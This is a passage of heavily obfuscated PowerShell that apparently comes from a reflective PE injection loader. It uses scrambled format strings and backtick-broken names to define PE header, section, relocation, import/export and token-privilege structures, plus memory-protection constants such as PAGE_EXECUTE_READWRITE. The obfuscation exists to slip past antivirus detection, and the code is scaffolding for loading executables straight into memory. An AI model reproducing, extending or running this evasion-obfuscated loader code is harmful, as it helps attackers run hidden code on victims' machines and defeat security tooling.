        ${T`YPE`BUilDer} = ${mOD`ULE`BU`iLDER}.("{2}{1}{0}" -f'eType','fin','De').Invoke(("{1}{2}{4}{0}{3}" -f'G','I','M','E_DOS_HEADER','A'), ${AT`Tr`IbUTEs}, [System.ValueType], 64)
        ${TyPE`Bu`Ilder}.("{0}{2}{3}{1}"-f'Defin','d','eFi','el').Invoke(("{1}{0}" -f 'gic','e_ma'), [UInt16], ("{1}{0}" -f 'ic','Publ')) | &("{0}{1}{2}"-f 'Out','-Nul','l')
        ${TYPE`BUI`ld`Er}.("{2}{0}{3}{1}"-f 'fineFi','ld','De','e').Invoke(("{0}{1}" -f'e_cb','lp'), [UInt16], ("{1}{0}" -f'ublic','P')) | &("{0}{2}{1}"-f'Out','Null','-')
        ${ty`pe`BuIld`ER}.("{2}{1}{3}{0}"-f 'ield','in','Def','eF').Invoke(("{1}{0}"-f 'cp','e_'), [UInt16], ("{1}{0}" -f'ublic','P')) | &("{1}{0}" -f'Null','Out-')
        ${Ty`PE`BU`iLdEr}.("{1}{0}{3}{2}"-f 'eFi','Defin','d','el').Invoke(("{0}{1}{2}"-f 'e','_cr','lc'), [UInt16], ("{2}{0}{1}" -f 'ubli','c','P')) | &("{1}{2}{0}" -f'-Null','Ou','t')
        ${Ty`PeBu`ild`eR}.("{1}{0}{3}{2}" -f'eFi','Defin','d','el').Invoke(("{1}{0}{2}" -f 'parhd','e_c','r'), [UInt16], ("{2}{1}{0}"-f 'c','li','Pub')) | &("{2}{1}{0}"-f 'ull','N','Out-')
        ${T`Y`Peb`UILDer}.("{0}{2}{1}" -f'Defi','ield','neF').Invoke(("{2}{0}{1}"-f'all','oc','e_min'), [UInt16], ("{1}{0}"-f'c','Publi')) | &("{2}{0}{1}"-f'ut-N','ull','O')
        ${t`ypeBuIl`deR}.("{2}{1}{0}"-f 'd','eFiel','Defin').Invoke(("{0}{1}{2}" -f'e_m','axallo','c'), [UInt16], ("{0}{1}"-f 'Publ','ic')) | &("{0}{1}{2}"-f'Ou','t','-Null')
        ${t`YP`Ebui`ldeR}.("{0}{1}{2}" -f'Defi','neF','ield').Invoke(("{1}{0}" -f 's','e_s'), [UInt16], ("{0}{1}" -f 'P','ublic')) | &("{0}{1}"-f'Out-N','ull')
        ${TYpEb`UI`L`der}.("{2}{0}{1}" -f 'neFi','eld','Defi').Invoke(("{1}{0}" -f '_sp','e'), [UInt16], ("{1}{0}" -f'lic','Pub')) | &("{1}{0}" -f 'll','Out-Nu')
        ${tYP`E`BUil`dER}.("{0}{2}{1}{3}" -f 'De','Fiel','fine','d').Invoke(("{0}{1}"-f'e_csu','m'), [UInt16], ("{0}{2}{1}"-f 'P','ic','ubl')) | &("{1}{2}{0}"-f'l','Out-Nu','l')
        ${TyPEbuI`l`D`ER}.("{3}{2}{1}{0}"-f 'd','el','ineFi','Def').Invoke(("{0}{1}"-f'e_i','p'), [UInt16], ("{0}{1}"-f'P','ublic')) | &("{1}{0}" -f'ut-Null','O')
        ${T`ypEBui`L`deR}.("{0}{2}{1}" -f'De','eld','fineFi').Invoke(("{1}{0}" -f'cs','e_'), [UInt16], ("{2}{1}{0}"-f 'blic','u','P')) | &("{0}{1}{2}" -f'O','ut-Nu','ll')
        ${tYP`EB`UiLD`eR}.("{1}{3}{0}{2}"-f'ineFie','De','ld','f').Invoke(("{0}{1}" -f 'e_lfarl','c'), [UInt16], ("{0}{1}{2}" -f'P','ubl','ic')) | &("{1}{2}{0}" -f 'l','Out-','Nul')
        ${tYPE`Bu`IlDer}.("{2}{3}{0}{1}" -f 'ine','Field','De','f').Invoke(("{0}{1}" -f 'e','_ovno'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{1}{0}{2}"-f't-Nu','Ou','ll')

        ${E`_R`ESfIElD} = ${T`yp`ebuilDEr}.("{2}{1}{0}"-f'eField','n','Defi').Invoke(("{1}{0}"-f'res','e_'), [UInt16[]], ("{3}{5}{6}{4}{0}{1}{2}" -f 'e','ldMarsha','l','Pub','Fi','lic, H','as'))
        ${cOnS`Tr`UCto`RvAL`Ue} =  $Dt43Mq::"by`ValAr`RaY"
        ${fIe`LDA`Rr`AY} = @( $60Ua.("{2}{0}{1}"-f'tF','ield','Ge').Invoke(("{2}{1}{0}"-f 'st','zeCon','Si')))
        ${A`T`TR`iBbUiLDER} = &("{0}{1}{2}"-f 'New','-O','bject') ("{1}{2}{4}{5}{3}{7}{6}{0}{8}"-f'teBuilde','Sy','stem.R','ion.Emit.Cus','ef','lect','tribu','tomAt','r')(${Con`St`RuCTO`Ri`NfO}, ${Co`NstRuC`T`o`R`VaLuE}, ${FIeld`A`RraY}, @([Int32] 4))
        ${E_rE`sF`I`eld}.("{0}{1}{2}{3}{4}" -f'SetCust','om','Attr','i','bute').Invoke(${a`Ttr`ibbuIL`DeR})

        ${tYPeBU`i`LDEr}.("{3}{1}{2}{0}"-f'eld','eF','i','Defin').Invoke(("{1}{2}{0}"-f'oemid','e','_'), [UInt16], ("{2}{0}{1}"-f 'ub','lic','P')) | &("{1}{0}"-f 'ull','Out-N')
        ${tY`PE`Bui`ldEr}.("{2}{1}{0}"-f 'ield','efineF','D').Invoke(("{3}{0}{1}{2}"-f 'mi','nf','o','e_oe'), [UInt16], ("{1}{0}"-f 'c','Publi')) | &("{0}{1}" -f 'Out','-Null')

        ${e_`R`ES2Fie`ld} = ${T`YP`eb`UiLDer}.("{2}{0}{1}" -f'efi','neField','D').Invoke(("{0}{1}" -f'e_r','es2'), [UInt16[]], ("{6}{3}{0}{1}{5}{2}{4}" -f', Has','FieldMars','a','blic','l','h','Pu'))
        ${c`oNSTRUc`TorVAl`Ue} =  (ChilDitem  ('vAR'+'I'+'AblE:'+'dt43MQ')).VAlUE::"byV`AlaRR`AY"
        ${aTtRIBBU`ILD`eR} = &("{2}{1}{0}"-f 'Object','ew-','N') ("{3}{5}{1}{0}{6}{4}{2}{7}{8}" -f'.Ref','stem','Att','S','t.Custom','y','lection.Emi','ributeBui','lder')(${Co`Ns`Tr`U`CtorinfO}, ${conS`T`RuCto`RvAlUE}, ${fieL`D`ARRay}, @([Int32] 10))
        ${e_r`Es`2field}.("{3}{0}{4}{2}{1}" -f'Custom','e','ut','Set','Attrib').Invoke(${at`T`RiBbUi`LDeR})

        ${tY`pEb`UIldER}.("{1}{0}{2}" -f 'efineFie','D','ld').Invoke(("{0}{2}{1}"-f 'e_lfa','ew','n'), [Int32], ("{0}{1}" -f 'Pu','blic')) | &("{0}{2}{1}" -f'Ou','l','t-Nul')
        ${I`mAg`e_`DOs_hea`DER} = ${TYPEBu`iLD`er}.("{2}{1}{3}{0}" -f 'teType','r','C','ea').Invoke()   
        ${wI`N32`TYp`Es} | &("{1}{2}{0}"-f'ber','A','dd-Mem') -MemberType ("{2}{0}{1}" -f'e','Property','Not') -Name ("{1}{0}{3}{4}{2}"-f 'D','IMAGE_','ER','OS_H','EAD') -Value ${IMage`_Do`S`_HEaDeR}

        
        ${a`TTrIBu`TeS} = ("{3}{0}{13}{15}{4}{6}{17}{19}{5}{1}{11}{14}{9}{7}{16}{10}{12}{18}{2}{8}" -f 'utoLayout, ','lLayo','ldIn','A','las','tia','s, Class,','eale','it','S','or','ut','eF','An',', ','siC','d, Bef',' Pu','ie','blic, Sequen')
        ${Typeb`UIl`dEr} = ${M`oDuLE`Bu`ILDER}.("{2}{0}{1}" -f 'efine','Type','D').Invoke(("{4}{2}{3}{0}{1}"-f'DE','R','E_SECTION_HE','A','IMAG'), ${AttRi`But`Es}, [System.ValueType], 40)

        ${Nam`efI`eLD} = ${TYpe`B`U`iLDER}.("{1}{0}{2}" -f'ef','D','ineField').Invoke(("{1}{0}" -f'e','Nam'), [Char[]], ("{2}{5}{4}{1}{3}{0}"-f 'arshal','as','Pub','FieldM','c, H','li'))
        ${C`On`S`TrUC`ToRVAlUe} =  (VariaBlE  dt43mQ  -VAluEO)::"BYV`Alarr`AY"
        ${AT`T`RiBBUi`lDeR} = &("{3}{0}{1}{2}" -f 'b','jec','t','New-O') ("{5}{6}{1}{11}{4}{9}{2}{3}{10}{8}{7}{0}" -f'r','ection','om','At','.C','System.','Refl','uilde','ibuteB','ust','tr','.Emit')(${C`onst`R`UCT`OrInfO}, ${ConStR`UCto`R`V`AlUe}, ${FI`E`LdARRAy}, @([Int32] 8))
        ${Name`F`IE`Ld}.("{1}{2}{3}{0}"-f 'e','SetCu','stomAttri','but').Invoke(${atTRIBBUI`ld`Er})

        ${tYPeb`U`IL`DER}.("{0}{2}{3}{1}" -f 'De','eld','fin','eFi').Invoke(("{3}{2}{1}{0}"-f'e','ualSiz','irt','V'), [UInt32], ("{2}{1}{0}"-f 'ic','l','Pub')) | &("{2}{0}{1}" -f'Nul','l','Out-')
        ${tYPEBui`l`D`er}.("{2}{3}{1}{0}" -f 'd','neFiel','Def','i').Invoke(("{0}{2}{1}" -f'V','ualAddress','irt'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{2}{1}{0}"-f 'l','ul','Out-N')
        ${TyP`e`BuiLd`er}.("{1}{2}{0}" -f'ld','DefineFi','e').Invoke(("{3}{0}{1}{2}"-f 'OfR','awDa','ta','Size'), [UInt32], ("{0}{1}{2}"-f 'Pu','bl','ic')) | &("{0}{1}{2}"-f'Out-N','ul','l')
        ${Ty`pE`BuILd`Er}.("{0}{2}{1}" -f'Define','d','Fiel').Invoke(("{2}{4}{1}{3}{0}"-f 'ata','erToRa','Po','wD','int'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{2}{0}{1}"-f 'l','l','Out-Nu')
        ${tYPebU`ILD`ER}.("{2}{0}{1}" -f 'ineFie','ld','Def').Invoke(("{5}{2}{1}{4}{0}{3}"-f 'oca','terToR','oin','tions','el','P'), [UInt32], ("{0}{1}{2}"-f'P','ubl','ic')) | &("{1}{2}{0}"-f'ull','Out-','N')
        ${TY`PE`B`UILDER}.("{3}{1}{2}{0}" -f 'ield','fin','eF','De').Invoke(("{4}{1}{2}{0}{3}{5}"-f 'nenumbe','interToL','i','r','Po','s'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{1}{0}" -f 'l','Out-Nul')
        ${TYPe`Bui`ld`er}.("{0}{1}{2}"-f'Define','Fie','ld').Invoke(("{5}{4}{2}{3}{1}{0}"-f'tions','a','OfRel','oc','r','Numbe'), [UInt16], ("{0}{1}"-f 'Pu','blic')) | &("{0}{1}"-f'Out-Nul','l')
        ${T`Y`PebuiLD`ER}.("{0}{2}{1}"-f'De','ld','fineFie').Invoke(("{0}{2}{1}{4}{3}"-f 'Nu','inenumb','mberOfL','s','er'), [UInt16], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}{2}"-f'ul','Out-N','l')
        ${tYpEb`U`ILd`eR}.("{1}{2}{0}" -f'd','Defi','neFiel').Invoke(("{3}{0}{1}{2}" -f 'ract','eristi','cs','Cha'), [UInt32], ("{0}{1}"-f'Pub','lic')) | &("{0}{1}"-f'O','ut-Null')
        ${I`MagE`_SEcti`oN_`H`eADer} = ${TY`PeB`UILDEr}.("{3}{1}{0}{2}" -f'teTyp','ea','e','Cr').Invoke()
        ${W`in3`2TY`Pes} | &("{0}{2}{1}"-f'Add','r','-Membe') -MemberType ("{2}{1}{0}" -f'erty','p','NotePro') -Name ("{1}{4}{3}{0}{2}{5}" -f 'ON_','IMA','HEADE','ECTI','GE_S','R') -Value ${IMAge_`seC`TIon`_hE`AdEr}

        
        ${atTRI`Bu`T`es} = ("{8}{3}{16}{18}{1}{6}{21}{14}{10}{9}{0}{12}{7}{2}{5}{15}{19}{11}{20}{17}{13}{4}"-f 'c, Sequ','Ansi','lLayo','y','ieldInit','u','Class, ','ntia','AutoLa','li','b','o','e','F','ass, Pu','t, Sealed','out','e',', ',', Bef','r','Cl')
        ${t`yPe`BUiLDER} = ${mOdULE`BuIL`D`Er}.("{0}{2}{1}" -f'Defin','ype','eT').Invoke(("{0}{1}{3}{2}" -f'IMAG','E_BA','ON','SE_RELOCATI'), ${ATtr`I`BuTEs}, [System.ValueType], 8)
        ${ty`peB`UILd`er}.("{2}{1}{3}{0}"-f 'd','neFie','Defi','l').Invoke(("{1}{0}{2}"-f 'irtualAddres','V','s'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{1}{0}" -f 'ut-Null','O')
        ${tYP`eBuIL`Der}.("{2}{0}{3}{1}"-f 'fineFi','d','De','el').Invoke(("{2}{0}{1}{3}"-f'ize','O','S','fBlock'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
        ${IMAG`e_ba`SE_RE`lOC`AT`iON} = ${tYp`Ebu`ilDER}.("{0}{2}{1}"-f 'Cr','pe','eateTy').Invoke()
        ${wIN3`2t`yPEs} | &("{1}{3}{2}{0}" -f 'ember','Add','M','-') -MemberType ("{3}{1}{2}{0}" -f 'rty','rop','e','NoteP') -Name ("{3}{0}{4}{2}{1}" -f'MA','E_RELOCATION','AS','I','GE_B') -Value ${imag`e`_ba`se_Rel`OCA`Ti`oN}

        
        ${a`TTr`I`BUTes} = ("{5}{6}{0}{12}{3}{9}{4}{11}{2}{7}{8}{1}{10}" -f'si','reFieldI','ialLa','lass, Class','ublic, Se','AutoL','ayout, An','yout, Sealed,',' Befo',', P','nit','quent','C')
        ${ty`peBui`ld`eR} = ${modU`l`e`BUi`lDeR}.("{2}{1}{0}{3}"-f 'Typ','ne','Defi','e').Invoke(("{2}{0}{3}{1}{5}{4}{6}" -f 'MAGE_IMPOR','_DESC','I','T','IP','R','TOR'), ${aT`T`RIbUT`eS}, [System.ValueType], 20)
        ${tYPeb`Ui`ldeR}.("{1}{0}{2}" -f'fineFiel','De','d').Invoke(("{0}{3}{1}{4}{2}"-f 'Charac','er','tics','t','is'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{1}{0}" -f 'ull','Out-N')
        ${T`YPeBuIl`d`Er}.("{2}{0}{1}"-f'e','fineField','D').Invoke(("{3}{2}{0}{1}" -f 'teSta','mp','a','TimeD'), [UInt32], ("{1}{0}"-f'c','Publi')) | &("{2}{0}{1}" -f '-N','ull','Out')
        ${Ty`P`e`BUIldEr}.("{3}{0}{1}{2}" -f'e','l','d','DefineFi').Invoke(("{2}{0}{3}{1}"-f'rw','ain','Fo','arderCh'), [UInt32], ("{0}{1}{2}" -f'Pub','l','ic')) | &("{1}{2}{0}" -f 'l','Out-Nu','l')
        ${TYP`eB`UiLD`eR}.("{1}{2}{0}"-f 'eField','De','fin').Invoke(("{0}{1}"-f 'N','ame'), [UInt32], ("{0}{2}{1}"-f'Pub','ic','l')) | &("{0}{2}{1}" -f 'Ou','ll','t-Nu')
        ${T`Y`PEBUiLDER}.("{2}{1}{0}" -f 'ield','F','Define').Invoke(("{0}{1}{2}" -f'First','Th','unk'), [UInt32], ("{1}{0}{2}" -f 'bli','Pu','c')) | &("{0}{2}{1}" -f'O','ll','ut-Nu')
        ${Ima`g`E_`imPOrt`_De`scRiPTor} = ${ty`PEBuI`l`dER}.("{2}{0}{1}" -f'reateTy','pe','C').Invoke()
        ${W`IN3`2tY`pes} | &("{0}{2}{1}"-f 'Ad','Member','d-') -MemberType ("{0}{1}{2}" -f 'No','teProper','ty') -Name ("{3}{1}{2}{0}{4}"-f'RIPT','MA','GE_IMPORT_DESC','I','OR') -Value ${I`ma`ge`_iMPOr`T_`d`eSCr`iPtOR}

        
        ${At`Tr`ibU`TeS} = ("{13}{4}{2}{0}{9}{12}{1}{7}{5}{10}{11}{8}{3}{6}"-f', Publ','ntial','s',' BeforeF','ss, Clas','y','ieldInit','La','aled,','ic, Seq','out, S','e','ue','AutoLayout, AnsiCla')
        ${typE`BUil`d`eR} = ${mOD`Uleb`UiLD`Er}.("{2}{0}{1}" -f'neTy','pe','Defi').Invoke(("{6}{5}{4}{0}{1}{2}{3}"-f'T_DIRECT','O','R','Y','OR','P','IMAGE_EX'), ${at`TR`I`BUTeS}, [System.ValueType], 40)
        ${tYpE`BU`IL`der}.("{1}{0}{2}"-f'eFiel','Defin','d').Invoke(("{3}{1}{2}{0}"-f 'istics','hara','cter','C'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{1}{2}{0}" -f 'Null','O','ut-')
        ${typEb`U`IlD`er}.("{1}{0}{2}" -f 'ef','D','ineField').Invoke(("{1}{2}{3}{0}" -f 'tamp','T','ime','DateS'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{1}{0}"-f 'll','Out-Nu')
        ${typEb`Ui`lD`Er}.("{1}{3}{0}{2}"-f'F','Def','ield','ine').Invoke(("{1}{0}{2}"-f 'rs','MajorVe','ion'), [UInt16], ("{0}{1}"-f'P','ublic')) | &("{0}{1}{2}"-f 'O','ut-Nu','ll')
        ${t`Ypebuil`D`er}.("{0}{1}{2}" -f 'Defin','eFi','eld').Invoke(("{0}{1}{2}" -f'MinorVer','sio','n'), [UInt16], ("{1}{0}"-f'lic','Pub')) | &("{0}{2}{1}"-f 'O','t-Null','u')
        ${t`Yp`EB`UiLder}.("{1}{2}{0}{3}"-f 'i','Define','F','eld').Invoke(("{0}{1}" -f 'N','ame'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}" -f'Out-','l','Nul')
        ${Ty`P`eBuilDER}.("{1}{3}{0}{2}" -f 'e','De','Field','fin').Invoke(("{0}{1}" -f 'Ba','se'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
        ${T`YpEBUIl`Der}.("{1}{3}{0}{2}"-f'el','Defin','d','eFi').Invoke(("{5}{4}{1}{0}{3}{2}"-f'OfF','er','s','unction','umb','N'), [UInt32], ("{1}{0}{2}"-f 'u','P','blic')) | &("{0}{2}{1}"-f'Out-','ull','N')
        ${TYpEbu`il`d`ER}.("{1}{3}{0}{2}" -f 'i','Define','eld','F').Invoke(("{3}{1}{2}{0}" -f 'mes','berO','fNa','Num'), [UInt32], ("{1}{0}"-f 'c','Publi')) | &("{1}{2}{0}" -f'll','O','ut-Nu')
        ${ty`pEBUIlD`er}.("{3}{0}{1}{2}"-f 'fine','Fie','ld','De').Invoke(("{1}{0}{3}{2}"-f'ddres','A','OfFunctions','s'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{0}{1}" -f 'Out-N','ull')
        ${tYpe`B`U`ildEr}.("{1}{0}{2}"-f'f','De','ineField').Invoke(("{3}{0}{2}{1}" -f's','OfNames','s','Addre'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{0}{1}" -f 'Out-N','ull')
        ${t`YP`E`BuildeR}.("{0}{3}{1}{2}" -f'D','neFiel','d','efi').Invoke(("{1}{4}{0}{2}{3}"-f'Name','Ad','O','rdinals','dressOf'), [UInt32], ("{2}{0}{1}"-f'li','c','Pub')) | &("{0}{1}" -f 'Out-N','ull')
        ${i`mAgE_EXp`or`T_dIReCT`orY} = ${t`yP`EB`UILDeR}.("{0}{3}{1}{2}" -f'Cr','p','e','eateTy').Invoke()
        ${WIn`32`TYPEs} | &("{1}{0}{2}"-f'-Memb','Add','er') -MemberType ("{0}{2}{1}"-f 'Not','erty','eProp') -Name ("{1}{0}{3}{4}{2}{5}"-f'GE_','IMA','ECT','E','XPORT_DIR','ORY') -Value ${IM`AGE`_`eXpoRT_diR`eCTOry}
        
        
        ${A`TTRi`BUTES} = ("{10}{3}{8}{2}{1}{0}{16}{15}{5}{4}{13}{12}{11}{6}{7}{14}{9}" -f ' P','lass, Class,','iC','An','entia',', Sequ','a','led, Be','s','Init','AutoLayout, ','e','Layout, S','l','foreField','ic','ubl')
        ${T`y`pEB`UiLDEr} = ${MODULe`BUil`deR}.("{0}{1}{2}" -f 'D','efineTy','pe').Invoke(("{1}{0}" -f'UID','L'), ${AtTrIbu`T`es}, [System.ValueType], 8)
        ${TYp`eB`U`iLDEr}.("{1}{0}{3}{2}" -f'ne','Defi','ield','F').Invoke(("{1}{2}{0}" -f 'rt','Low','Pa'), [UInt32], ("{1}{0}" -f 'blic','Pu')) | &("{0}{1}"-f 'Out-Nul','l')
        ${T`YpebuIl`Der}.("{3}{2}{1}{0}" -f'Field','ine','f','De').Invoke(("{2}{1}{0}" -f 't','ighPar','H'), [UInt32], ("{2}{1}{0}" -f 'ic','ubl','P')) | &("{0}{2}{1}" -f'Out-','ull','N')
        ${lu`iD} = ${Ty`P`Eb`UIlder}.("{1}{0}{2}{3}"-f 'teTy','Crea','p','e').Invoke()
        ${W`I`N32TypeS} | &("{1}{0}{2}"-f 'd-Me','Ad','mber') -MemberType ("{1}{2}{3}{0}"-f'y','Note','Proper','t') -Name ("{0}{1}" -f'L','UID') -Value ${Lu`ID}
        
        
        ${aTtR`iB`UtEs} = ("{11}{6}{14}{4}{10}{0}{9}{13}{3}{1}{5}{12}{2}{7}{8}" -f ' ','lL','Sealed, BeforeFi','ntia','yout, AnsiClass, ','ay','t','e','ldInit','Seq','Class, Public,','Au','out, ','ue','oLa')
        ${Ty`Pebuil`d`ER} = ${mO`dulE`BU`iLdER}.("{0}{2}{1}"-f'D','neType','efi').Invoke(("{1}{0}{2}{3}"-f'_ATTRIB','LUID_AND','UT','ES'), ${att`Ri`BU`TeS}, [System.ValueType], 12)
        ${type`Bu`iLDer}.("{0}{1}{2}" -f'D','ef','ineField').Invoke(("{0}{1}" -f'Lu','id'), ${L`Uid}, ("{1}{0}" -f'c','Publi')) | &("{1}{0}" -f'Null','Out-')
        ${typE`B`U`ILDeR}.("{2}{0}{1}" -f'e','fineField','D').Invoke(("{1}{0}{2}" -f 'tr','At','ibutes'), [UInt32], ("{0}{1}{2}" -f 'P','ubl','ic')) | &("{1}{2}{0}"-f'l','Out-','Nul')
        ${l`UI`d_aN`d_AtTribUTEs} = ${tyPeBu`I`LDeR}.("{1}{0}{2}"-f 'teT','Crea','ype').Invoke()
        ${WI`N32ty`P`Es} | &("{1}{2}{0}"-f 'ber','Add-','Mem') -MemberType ("{2}{0}{1}" -f'r','ty','NotePrope') -Name ("{4}{3}{5}{0}{2}{1}" -f'_ATTR','S','IBUTE','UID_AN','L','D') -Value ${LUId_`An`d_`AtTr`IBuTeS}
        
        
        ${attr`ibu`T`ES} = ("{4}{9}{8}{1}{7}{2}{5}{17}{14}{0}{13}{6}{10}{12}{16}{11}{3}{15}"-f'ut,','Class, P','bl','ni','Au','ic','Sealed, Before','u','t, AnsiClass, ','toLayou','Fi','I','e',' ','lLayo','t','ld',', Sequentia')
        ${ty`PebU`Il`dER} = ${moD`UlEbU`ILDER}.("{0}{1}{2}"-f 'Def','ine','Type').Invoke(("{4}{2}{3}{1}{0}" -f 'GES','ILE','KEN','_PRIV','TO'), ${aTtR`ib`Utes}, [System.ValueType], 16)
        ${tYp`Eb`UIL`DER}.("{2}{1}{0}"-f 'ld','ineFie','Def').Invoke(("{4}{0}{2}{1}{3}" -f'geC','n','ou','t','Privile'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{0}{1}{2}" -f'Out-Nu','l','l')
        ${t`YP`eBuI`ldEr}.("{3}{1}{0}{2}"-f 'eFi','in','eld','Def').Invoke(("{2}{3}{0}{1}"-f 'v','ileges','P','ri'), ${L`U`ID_AND_attRIbUt`Es}, ("{0}{1}" -f'Publ','ic')) | &("{0}{1}" -f 'Out','-Null')
        ${tOkEN_PrIv`il`e`gEs} = ${t`YpeBu`I`ldEr}.("{0}{2}{1}" -f'CreateT','pe','y').Invoke()
        ${W`In`32tY`Pes} | &("{2}{0}{1}" -f'd','d-Member','A') -MemberType ("{2}{0}{3}{1}" -f'ote','y','N','Propert') -Name ("{1}{4}{0}{3}{2}" -f 'EN_P','TO','ILEGES','RIV','K') -Value ${Tok`en_pr`i`VILeg`Es}

        return ${WIn3`2TY`P`es}
    }

    Function Get-w`iN32`Co`NS`T`ANTS
    {
        ${w`in3`2CO`NsTaN`TS} = &("{2}{1}{0}" -f't','jec','New-Ob') ("{2}{1}{0}{3}"-f 'm.Objec','e','Syst','t')
        
        ${WIn`32conSt`AN`Ts} | &("{2}{0}{1}" -f'-Mem','ber','Add') -MemberType ("{0}{1}{2}{3}"-f'NoteP','ro','pe','rty') -Name ("{0}{2}{1}" -f 'ME','MIT','M_COM') -Value 0x00001000
        ${WIn3`2co`N`staNts} | &("{1}{0}{2}"-f 'b','Add-Mem','er') -MemberType ("{1}{2}{0}"-f 'rty','No','tePrope') -Name ("{3}{2}{1}{0}"-f 'E','RV','EM_RESE','M') -Value 0x00002000
        ${wI`N32c`ON`Stants} | &("{2}{1}{0}" -f'ember','-M','Add') -MemberType ("{2}{1}{0}"-f'operty','ePr','Not') -Name ("{0}{2}{1}{3}" -f 'PA','CCE','GE_NOA','SS') -Value 0x01
        ${wI`N3`2C`onS`TaNts} | &("{0}{1}{2}"-f 'A','dd-Memb','er') -MemberType ("{3}{1}{0}{2}" -f'ert','Prop','y','Note') -Name ("{0}{2}{1}" -f'PAGE','NLY','_READO') -Value 0x02
        ${wIN32`c`OnSTA`NTs} | &("{0}{1}{2}"-f 'A','dd-','Member') -MemberType ("{1}{2}{0}"-f 'rty','N','otePrope') -Name ("{1}{0}{2}{4}{3}"-f'READ','PAGE_','WR','E','IT') -Value 0x04
        ${WiN`32Co`NS`TaNTs} | &("{3}{2}{0}{1}" -f 'e','r','Memb','Add-') -MemberType ("{2}{1}{3}{0}"-f'ty','tePr','No','oper') -Name ("{2}{1}{0}{3}"-f 'ECO','AGE_WRIT','P','PY') -Value 0x08
        ${W`IN32CON`S`TANts} | &("{1}{2}{0}"-f'ber','Add-Me','m') -MemberType ("{2}{1}{0}{3}" -f 'rt','Prope','Note','y') -Name ("{3}{0}{1}{2}" -f 'GE_EXEC','UT','E','PA') -Value 0x10
        ${WIn3`2`c`onSt`ANtS} | &("{2}{1}{0}{3}" -f'Memb','-','Add','er') -MemberType ("{2}{0}{1}" -f 'teP','roperty','No') -Name ("{1}{0}{3}{2}"-f 'CUTE_R','PAGE_EXE','AD','E') -Value 0x20
        ${WIn32C`oN`StA`NTS} | &("{0}{2}{1}"-f'Add-Me','ber','m') -MemberType ("{3}{1}{2}{0}"-f'perty','teP','ro','No') -Name ("{3}{2}{4}{0}{1}" -f'READW','RITE','TE','PAGE_EXECU','_') -Value 0x40
        ${w`i`N3`2coNst`ANTS} | &("{0}{2}{1}" -f'Add-','er','Memb') -MemberType ("{0}{3}{2}{1}" -f'No','perty','ePro','t') -Name ("{4}{5}{2}{3}{0}{6}{1}"-f'WRI','ECOPY','EX','ECUTE_','PAG','E_','T') -Value 0x80
        ${w`in32C`OnSTANTs} | &("{1}{2}{0}" -f'r','Ad','d-Membe') -MemberType ("{0}{1}{3}{2}" -f'Note','Pr','ty','oper') -Name ("{0}{1}{2}" -f 'P','AG','E_NOCACHE') -Value 0x200
        ${WIn3`2cO`NSTan`TS} | &("{2}{1}{0}{3}"-f'd-Mem','d','A','ber') -MemberType ("{2}{1}{0}" -f 'y','tePropert','No') -Name ("{4}{1}{7}{3}{0}{2}{6}{5}" -f 'SE','MAGE_R','D_ABSO','BA','I','E','LUT','EL_') -Value 0
        ${W`IN32C`oNSTaN`Ts} | &("{2}{0}{1}" -f 'M','ember','Add-') -MemberType ("{2}{1}{0}"-f'y','opert','NotePr') -Name ("{2}{1}{5}{3}{0}{4}" -f'I','A','IM','_REL_BASED_H','GHLOW','GE') -Value 3
        ${WIn`32cOn`s`TAN`Ts} | &("{2}{1}{0}" -f'd-Member','d','A') -MemberType ("{0}{1}{2}" -f 'N','oteProp','erty') -Name ("{2}{3}{5}{0}{1}{4}" -f 'SE','D_DIR6','IMAGE_','REL_B','4','A') -Value 10
        ${w`iN32cOn`ST`ANtS} | &("{2}{0}{1}" -f'dd','-Member','A') -MemberType ("{1}{3}{2}{0}"-f 'erty','NoteP','op','r') -Name ("{4}{3}{1}{5}{6}{2}{0}" -f'RDABLE','AG','SCA','M','I','E_SCN_','MEM_DI') -Value 0x02000000
        ${WI`N3`2`C`OnSTAntS} | &("{0}{1}{2}" -f 'A','dd-Me','mber') -MemberType ("{1}{0}{2}"-f 'Pr','Note','operty') -Name ("{2}{3}{1}{0}{4}" -f 'EC','AGE_SCN_MEM_EX','I','M','UTE') -Value 0x20000000
        ${W`i`N32ConsT`A`NtS} | &("{0}{1}{2}" -f'A','dd-','Member') -MemberType ("{2}{0}{1}" -f'e','rty','NoteProp') -Name ("{1}{3}{0}{2}"-f'M','IMAGE','_READ','_SCN_ME') -Value 0x40000000
        ${WI`N32C`oNsta`N`TS} | &("{1}{2}{0}" -f 'ber','A','dd-Mem') -MemberType ("{3}{2}{0}{1}" -f'tePr','operty','o','N') -Name ("{6}{4}{2}{0}{5}{3}{1}" -f'SCN_ME','RITE','_','W','AGE','M_','IM') -Value 0x80000000
        ${w`i`N32`cONst`ANTs} | &("{2}{1}{0}" -f'ber','d-Mem','Ad') -MemberType ("{1}{2}{0}"-f'ty','NoteP','roper') -Name ("{2}{4}{5}{3}{6}{1}{0}"-f 'D','CHE','IMAGE_SC','NOT_C','N','_MEM_','A') -Value 0x04000000
        ${w`i`N`32C`onStanTS} | &("{2}{0}{1}" -f '-Mem','ber','Add') -MemberType ("{1}{3}{0}{2}" -f'ropert','Not','y','eP') -Name ("{3}{0}{2}{1}" -f 'EM_','OMMIT','DEC','M') -Value 0x4000
        ${W`IN3`2COnSTAN`TS} | &("{1}{0}{3}{2}" -f'Me','Add-','er','mb') -MemberType ("{0}{3}{1}{2}" -f'NotePrope','t','y','r') -Name ("{0}{4}{3}{5}{1}{6}{2}" -f'IMAG','E_','E','UT','E_FILE_EXEC','ABL','IMAG') -Value 0x0002
